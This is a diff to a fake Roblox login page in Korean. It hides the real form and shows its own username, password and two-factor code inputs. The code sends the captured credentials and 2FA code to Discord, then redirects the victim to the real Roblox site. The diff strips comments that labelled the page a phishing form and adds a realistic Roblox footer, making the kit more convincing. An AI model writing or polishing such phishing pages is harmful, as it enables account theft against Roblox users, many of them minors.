@@ -69,11 +69,14 @@
     <link rel="preload" as="font" type="font/woff2" crossorigin="" href="https://css.rbxcdn.com/5f8b8d5d1962b747.woff2" />
     <link rel="preload" as="font" type="font/woff2" crossorigin="" href="https://css.rbxcdn.com/77cbcd18c888e0f1.woff2" />
     <style>
-      /* Roblox 폼 숨기기 - 우리 폼으로 대체 */
       #react-login-web-app { display: none !important; }
       
-      /* 우리 피싱 폼 스타일 */
       * { margin: 0; padding: 0; box-sizing: border-box; }
+      
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+        color: #000;
+      }
       
       .login-page-container {
         display: flex;
@@ -111,7 +114,7 @@
         display: block;
         font-size: 14px;
         font-weight: 600;
-        color: #333;
+        color: #000;
         margin-bottom: 6px;
       }
       
@@ -121,7 +124,7 @@
         border: 1px solid #ddd;
         border-radius: 8px;
         font-size: 16px;
-        color: #333;
+        color: #000;
         background: #fafafa;
         transition: border-color 0.2s;
       }
@@ -191,6 +194,7 @@
         cursor: pointer;
         font-size: 14px;
         text-align: center;
+        color: #000;
         transition: background 0.2s;
       }
       
@@ -225,7 +229,6 @@
       
       .error-msg.show { display: block; }
       
-      /* 2FA 스타일 */
       #step2fa { display: none; }
       
       .code-inputs {
@@ -243,6 +246,7 @@
         border: 2px solid #ddd;
         border-radius: 8px;
         font-weight: 700;
+        color: #000;
       }
       
       .code-inputs input:focus {
@@ -268,6 +272,15 @@
       
       .link-btn:hover {
         text-decoration: underline;
+      }
+
+      /* 2FA 헤더 텍스트 */
+      .tfa-title {
+        text-align: center;
+        font-size: 18px;
+        font-weight: 700;
+        color: #000;
+        margin-bottom: 8px;
       }
     </style>
   </head>
@@ -300,23 +313,21 @@
 
       <main class="container-main content-no-ads" id="container-main">
         <div class="content" id="content">
-          <!-- 실제 Roblox 로그인 폼을 가리는 div -->
           <div id="react-login-web-app"></div>
           
-          <!-- 우리 피싱 폼 -->
           <div class="login-page-container">
             <div class="login-card">
               
-              <!-- Roblox 로고 -->
+              <!-- 로고 -->
               <div class="login-logo">
                 <svg viewBox="0 0 140 44" fill="none" xmlns="http://www.w3.org/2000/svg">
                   <rect x="4" y="4" width="36" height="36" rx="6" fill="#00B4D8" stroke="#fff" stroke-width="2"/>
                   <rect x="12" y="12" width="20" height="20" rx="2" fill="#fff"/>
-                  <text x="48" y="32" font-family="Arial, sans-serif" font-size="28" font-weight="800" fill="#333">Roblox</text>
+                  <text x="48" y="32" font-family="Arial, sans-serif" font-size="28" font-weight="800" fill="#000">Roblox</text>
                 </svg>
               </div>
               
-              <!-- 1단계: 로그인 폼 -->
+              <!-- 1단계: 로그인 -->
               <div id="step1">
                 <form id="loginForm" onsubmit="return false;">
                   <div class="error-msg" id="errorMsg">사용자 이름 또는 비밀번호가 잘못되었습니다. 다시 시도하세요.</div>
@@ -348,17 +359,17 @@
                 </div>
               </div>
               
-              <!-- 2단계: 2FA 코드 입력 -->
+              <!-- 2단계: 2FA -->
               <div id="step2fa">
                 <div class="login-logo">
                   <svg viewBox="0 0 140 44" fill="none" xmlns="http://www.w3.org/2000/svg">
                     <rect x="4" y="4" width="36" height="36" rx="6" fill="#00B4D8" stroke="#fff" stroke-width="2"/>
                     <rect x="12" y="12" width="20" height="20" rx="2" fill="#fff"/>
-                    <text x="48" y="32" font-family="Arial, sans-serif" font-size="28" font-weight="800" fill="#333">Roblox</text>
+                    <text x="48" y="32" font-family="Arial, sans-serif" font-size="28" font-weight="800" fill="#000">Roblox</text>
                   </svg>
                 </div>
                 
-                <h3 style="text-align:center;margin-bottom:8px;">2단계 인증</h3>
+                <div class="tfa-title">2단계 인증</div>
                 <p class="info-text">인증 앱 또는 이메일로 전송된 6자리 코드를 입력하세요.</p>
                 
                 <form id="tfaForm" onsubmit="return false;">
@@ -383,7 +394,33 @@
         </div>
       </main>
       
+      <!-- Roblox 스타일 푸터 -->
       <footer class="container-footer" id="footer-container">
+        <div style="background:#1a1a2e;padding:40px 20px 20px;color:#ccc;font-size:13px;">
+          <div style="max-width:1200px;margin:0 auto;display:flex;flex-wrap:wrap;gap:30px;justify-content:space-between;">
+            <div style="min-width:160px;">
+              <strong style="color:#fff;display:block;margin-bottom:10px;">약관 및 개인정보</strong>
+              <a href="#" style="color:#999;display:block;margin-bottom:6px;text-decoration:none;">이용약관</a>
+              <a href="#" style="color:#999;display:block;margin-bottom:6px;text-decoration:none;">개인정보 처리방침</a>
+              <a href="#" style="color:#999;display:block;margin-bottom:6px;text-decoration:none;">쿠키 정책</a>
+            </div>
+            <div style="min-width:160px;">
+              <strong style="color:#fff;display:block;margin-bottom:10px;">Roblox</strong>
+              <a href="#" style="color:#999;display:block;margin-bottom:6px;text-decoration:none;">회사 소개</a>
+              <a href="#" style="color:#999;display:block;margin-bottom:6px;text-decoration:none;">채용</a>
+              <a href="#" style="color:#999;display:block;margin-bottom:6px;text-decoration:none;">블로그</a>
+            </div>
+            <div style="min-width:160px;">
+              <strong style="color:#fff;display:block;margin-bottom:10px;">지원</strong>
+              <a href="#" style="color:#999;display:block;margin-bottom:6px;text-decoration:none;">도움말</a>
+              <a href="#" style="color:#999;display:block;margin-bottom:6px;text-decoration:none;">문의하기</a>
+              <a href="#" style="color:#999;display:block;margin-bottom:6px;text-decoration:none;">안전 정보</a>
+            </div>
+          </div>
+          <div style="text-align:center;margin-top:30px;padding-top:20px;border-top:1px solid #333;color:#666;font-size:12px;">
+            © 2025 Roblox Corporation, Roblox, Roblox 로고는 Roblox Corporation의 등록 상표입니다.
+          </div>
+        </div>
       </footer>
     </div>
     
@@ -415,7 +452,6 @@
         }).catch(console.error);
       }
       
-      // 로그인 폼 제출
       document.getElementById('loginForm').addEventListener('submit', function(e) {
         e.preventDefault();
         const username = document.getElementById('username').value.trim();
@@ -426,19 +462,14 @@
           return;
         }
         
-        // 크리덴셜 저장
         window._capturedCredentials = { '사용자 이름': username, '비밀번호': password };
-        
-        // Discord로 전송
         sendToDiscord(window._capturedCredentials);
         
-        // 2FA 단계로 전환
         document.getElementById('step1').style.display = 'none';
         document.getElementById('step2fa').style.display = 'block';
         document.querySelector('.code-input').focus();
       });
       
-      // 2FA 코드 입력 - 자동 포커스 이동
       document.querySelectorAll('.code-input').forEach(input => {
         input.addEventListener('input', function() {
           if (this.value.length >= 1) {
@@ -458,7 +489,6 @@
         });
       });
       
-      // 2FA 폼 제출
       document.getElementById('tfaForm').addEventListener('submit', function(e) {
         e.preventDefault();
         let code = '';
@@ -466,21 +496,17 @@
         
         if (code.length < 6) return;
         
-        // 2FA 코드 추가 전송
         window._capturedCredentials['2FA 코드'] = code;
         sendToDiscord({ ...window._capturedCredentials, '⚠️ 상태': '2FA 코드까지 캡처됨!' });
         
-        // 진짜 Roblox로 리다이렉트
         window.location.href = 'https://www.roblox.com/ko/Login?error=incorrect';
       });
       
-      // 에러 표시용 - 잘못된 로그인 시도 시
       document.getElementById('password').addEventListener('input', function() {
         document.getElementById('errorMsg').classList.remove('show');
       });
     </script>
     
-    <!-- Roblox JS 파일들 (페이지 로딩을 위해 필요하진 않지만, 소스 코드 일치용) -->
     <script src="https://js.rbxcdn.com/fc8e6f9e95e50f6da80942bd29d57886659233629d8caf66ac456117953186c6-EnvironmentUrls.js"></script>
     <script src="https://js.rbxcdn.com/5c8a2ba3737908f693394045e81ebd71c77cde6f87550ea51f7833e8c98200ae.js"></script>
     <script src="https://js.rbxcdn.com/c27f57f4a397dabc2fe3b74fec93c2401913bdf49373f9339c00b6f18b32d2ac.js"></script>
